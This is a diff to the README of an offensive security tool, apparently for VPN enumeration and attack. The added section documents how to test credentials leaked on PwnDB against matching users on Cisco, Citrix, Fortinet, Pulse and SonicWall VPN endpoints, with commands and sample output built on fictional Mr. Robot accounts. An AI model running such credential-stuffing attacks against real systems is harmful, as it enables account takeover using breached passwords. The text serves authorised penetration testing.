@@ -318,7 +318,8 @@ tyrell.wellick@evilcorp.com
 
 * PwnDB
 
-This source is operated using a ported version of the one implemented in [sn0int]()
+This source is operated using a ported version of the one implemented in [sn0int](https://github.com/kpcyrd/sn0int).
+
 Note that this functionality requires to be connected to the TOR network. 
 
 ##### Start TOR
@@ -327,7 +328,6 @@ Note that this functionality requires to be connected to the TOR network.
 python manage.py -w workspace1 tor -c start
 
 [*] Starting TOR Browser, click on connect
-
 ```
 ##### Enumerate on on PwnDB
 
@@ -503,8 +503,88 @@ python manage.py -w workspace1 vpn -c attack -P passwords.txt
 [+] Done
 ```
 
+#### Perform a password spray or bruteforce using leaked credentials
+
+As Vortex keeps track of credentials leaked on PwnDB, a user can select
+to test all leaked credentials instead of providing a password file.
+
+However, consider this behaviour is much different to a normal password spray.
+In a normal password spraying attack, indeed, a single password is tried against 
+all users. In a leaked credentials attack, the leaked credentials is tested against 
+the specific user it was leaked with. So, as an example, if Vortex found
+the leaks:
+
+```
+User                            Leaks
+----------------------------    ----------------------------
+elliot.alderson@evilcorp.com    ["ISecretlyLoveAngela2020!"]
+tom.wellick@evilcorp.com        ["Puppy19!", "MySweetJ111!"]
+```
+
+Vortex will operate the following attempts, and just the following:
+
+```
+elliot.alderson@evilcorp.com:ISecretlyLoveAngela2020!
+tom.wellick@evilcorp.com:Puppy19!
+tom.wellick@evilcorp.com:MySweetJ111!
+```
+
+To perform this attack, no password file is needed, but it's required to set
+the (-L, or --leaks) parameter.
+
+```
+python manage.py -w workspace1 vpn -c attack -L
+
+   ,d#####F^      ,yy############yy       ^9#######,
+  ,######"      y###################by      ^9######,
+  ######^     y#####F""       ^"9######y      "######]
+ d#####^    ,#####" by klezVirus ^9#####,     ^######,
+,#####]    ,####F    yy#######y,    ^9####b     ^######
+[#####     ####F   ,###F""'"9####,    9####]     9#####
+#####F    [####   ,##F^  yy   "###b    9####,    ^#####]
+#####]    [###]   ###  dF""#b  ^###]   ^####]     #####]
+9####b    [####   9##, 9bd [#]  [##b    #####     [#####
+[#####     ####,   9##y, ,y##^  d##F    #####     [####]
+ #####b    ^####y   ^"#####"   d###^   ,####]     d#####
+ [#####,    ^####by          ,d###^    d####^     #####F
+  9#####y     "#####byyyyyyd####F^    d####F     [#####9
+   9#####b,     ""############"^    ,d####F     ,######
+    ^######b,       ""'""'"^      ,d#####F      d#####F
+
+[*] Choose an endpoint type to attack, or all to attack any supported endpoint
+0 : cisco
+1 : citrix
+2 : citrixlegacy
+3 : fortinet
+4 : pulse
+5 : sonicwall
+6 : all
+ $> 6
+[*] Attacking vpn.evilcorp.com:443
+  [+] elliot.alderson@evilcorp.com:ISecretlyLoveAngela2020! is valid!
+  [-] tyrell.wellick@evilcorp.com:Puppy19! is not valid.
+  [-] tyrell.wellick@evilcorp.com:MySweetJ111! is not valid.
+  [>] Found 1 valid logins
+[*] Updating Db...
+[+] Done
+```
+
 That's mostly it. Sometimes the tool can ask for more information before performing
 an attack, such as selecting the VPN realm/group.
+
+##### Showing results
+
+At any time, you can see valid logins you found using the following command:
+
+```
+python manage.py db -w workspace1 -c found-logins
+[+] Valid Logins Collected:
+  ID  Target                E-Mail                        Password
+----  --------------------  ----------------------------  ------------------------
+   1  vpn.evilcorp.com:443  tom.wellick@evilcorp.com      Joanna2021!
+   2  vpn.evilcorp.com:443  elliot.alderson@evilcorp.com  ISecretlyLoveAngela2020!
+[+] Done
+```
 
 #### Searching Social Network Profiles
 
